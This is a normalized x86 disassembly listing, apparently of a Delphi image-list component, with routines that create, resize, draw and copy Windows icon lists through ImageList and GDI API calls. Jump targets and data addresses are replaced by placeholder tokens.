mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44aeb4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_41a0e4
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_44af08
push ebx
push esi
push edi
call sub_40362c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413ecc
mov edx eax
mov eax edi
call sub_44bed4
mov eax [ edi + 0x50 ]
call sub_4032a0
mov eax edi
call sub_44b264
mov eax [ edi + 0x4c ]
call sub_4032a0
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a130
test bl bl
jle r-xdata
call sub_4032a0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403614
sub_44af74
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44b021
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44be5c
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44b040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b028
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_44b040
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b0e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_423198
mov eax ebx
call sub_422678
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41dbec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4129b0
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_422678
pop edx
call sub_41dfc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b0e8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44b104
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44b040
pop ecx
pop edx
pop ebx
retn
sub_44b13c
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44b02c
test al al
je r-xdata
mov eax esi
call sub_44b7fc
mov eax esi
call sub_44b040
mov eax esi
mov si 0xffef
call sub_40349c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b180
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44b02c
test al al
je r-xdata
mov eax esi
call sub_44b7fc
mov eax esi
call sub_44b040
mov eax esi
mov si 0xffef
call sub_40349c
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44b1c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b264
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44b104
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_40349c
sub_44b210
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44bde4
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4226e4
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44b264
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_40349c
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44b200
push eax
call ImageList_Destroy
sub_44b29c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44b32f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44b02c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b336
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov edx eax
mov eax ebx
call sub_44b808
sub_44b33c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b3eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b3ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b034
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b210
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b210
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3d5
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
sub_44b408
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b507
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b210
push eax
mov eax [ ebp - 0x4 ]
call sub_44b200
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b50e
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b4c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_42353c
mov eax [ ebp - 0x4 ]
call sub_44b034
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b1f0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b210
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
sub_44b524
push ebx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44b200
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44b548
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b75f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44b02c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b766
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404098
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44bde4
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b408
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor eax eax
push ebp
push sub_44b710
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b6f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b6d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4233e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_422678
call sub_41e4e4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b200
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_422678
call sub_41e4e4
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44b200
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44b200
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b6da
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_44b770
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b7ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44b524
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44b02c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax ebx
mov si 0xffef
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7f6
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push esi
mov eax ebx
call sub_44b200
push eax
call ImageList_Remove
sub_44b808
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44ae28
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_40349c
pop esi
pop ebx
retn
sub_44b840
push ebx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44b200
push eax
call ImageList_GetBkColor
call sub_44ae48
pop ebx
retn
sub_44b868
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44ae28
push eax
mov eax ebx
call sub_44b840
call sub_44ae28
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41e4e4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b200
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_422678
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41dbec
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_4129b0
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_422678
pop edx
call sub_41dfc4
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_422678
call sub_41e4e4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44b200
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_4129b0
mov eax [ ebx + 0x54 ]
call sub_422678
call sub_41e4e4
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41dbec
mov eax edi
call sub_41e4e4
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41dbec
mov eax edi
call sub_41e4e4
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4233e8
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44ba3c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44ba60
pop ebx
pop ebp
retn 0xc
sub_44ba60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b02c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44baac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4129b0
mov eax [ ebp - 0x4 ]
call sub_44c740
xor eax eax
push ebp
push sub_44bc45
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44bc28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44bc0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4233e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc12
mov eax [ ebp - 0x10 ]
call sub_4032a0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_422678
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41dfc4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41e4e4
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_422678
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41dfc4
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41e4e4
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b33c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44bc54
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b200
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44baac
sub_44bc74
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax ebx
call sub_44b264
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414434
mov eax ebx
call sub_44b7fc
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44be5c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44b200
mov edx eax
mov eax ebx
call sub_44b104
mov eax ebx
call sub_44b02c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b200
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b034
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44b200
push eax
call ImageList_GetBkColor
call sub_44ae48
mov edx eax
mov eax ebx
call sub_44b808
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44bc54
jmp r-xdata
sub_44bd34
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414518
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44be5c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44b7fc
mov eax esi
call sub_44b200
mov edx eax
mov eax ebx
call sub_44b104
mov eax ebx
call sub_44b02c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44b200
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44b034
jmp r-xdata
mov eax esi
call sub_44b200
push eax
call ImageList_GetBkColor
call sub_44ae48
mov edx eax
mov eax ebx
call sub_44b808
mov edx esi
mov eax ebx
call sub_44bc54
pop esi
pop ebx
retn
sub_44bde4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44be50
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44be57
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44be84
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_413de4
mov si 0xffff
call sub_40349c
inc ebp
dec edi
jne r-xdata
sub_44bed4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413cd4
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413de4
cmp ebp eax
jne r-xdata
sub_44bf2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407da4
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44bf70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44b524
mov ebx eax
mov eax edi
call sub_44b524
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44b524
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c04c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c02f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44bf2c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c036
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
mov eax edi
call sub_44b524
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44c060
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44b524
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
